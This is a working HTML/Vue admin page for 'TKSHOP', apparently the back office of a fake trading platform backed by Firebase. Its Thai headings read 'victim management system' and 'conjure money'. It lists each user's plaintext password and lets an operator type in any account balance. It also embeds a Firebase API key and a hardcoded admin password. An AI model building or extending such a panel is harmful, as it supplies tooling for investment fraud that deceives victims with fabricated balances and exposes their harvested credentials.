<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TKSHOP - ADMIN SYSTEM</title>
    <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/vant@4/lib/index.css"/>
    <script src="https://fastly.jsdelivr.net/npm/vue@3"></script>
    <script src="https://fastly.jsdelivr.net/npm/vant@4/lib/vant.min.js"></script>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, getDocs, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBf2BfaGTs6qQD3MO5tSZLLW-BuQFvDVwM",
            authDomain: "my-trading-db.firebaseapp.com",
            projectId: "my-trading-db",
            storageBucket: "my-trading-db.firebasestorage.app",
            messagingSenderId: "682968234759",
            appId: "1:682968234759:web:eb2978d1e4019b77cb23a2"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const { createApp, ref } = Vue;
        createApp({
            setup() {
                const loggedIn = ref(false);
                const pass = ref('');
                const users = ref([]);

                const login = () => {
                    if (pass.value === '33333') { loggedIn.value = true; loadUsers(); }
                    else { vant.showToast('รหัสผิด'); }
                };

                const loadUsers = async () => {
                    const snap = await getDocs(collection(db, "users"));
                    users.value = snap.docs.map(d => ({ id: d.id, ...d.data() }));
                };

                const editUser = async (user) => {
                    const newMoney = prompt("เสกเงินใหม่ (USD):", user.balance);
                    if (newMoney !== null) {
                        await updateDoc(doc(db, "users", user.id), { balance: parseFloat(newMoney), status: 'active' });
                        vant.showToast('อัปเดตแล้ว');
                        loadUsers();
                    }
                };
                return { loggedIn, pass, login, users, editUser };
            }
        }).use(vant).mount('#app');
    </script>
</head>
<body style="background:#f7f8fa;">
    <div id="app">
        <div v-if="!loggedIn" style="padding:50px 20px;">
            <van-field v-model="pass" type="password" placeholder="ADMIN PASSWORD" label="ADMIN" />
            <van-button block type="primary" @click="login" style="margin-top:20px;">LOG IN</van-button>
        </div>
        <div v-else>
            <van-nav-bar title="ระบบจัดการเหยื่อ"></van-nav-bar>
            <van-cell-group v-for="u in users" :key="u.id" style="margin-bottom:10px;">
                <van-cell :title="u.id" :label="'รหัส: ' + u.pass" :value="'$' + u.balance" />
                <van-cell>
                    <van-button size="small" type="success" @click="editUser(u)">เสกเงิน / อนุมัติ</van-button>
                </van-cell>
            </van-cell-group>
        </div>
    </div>
</body>
</html>
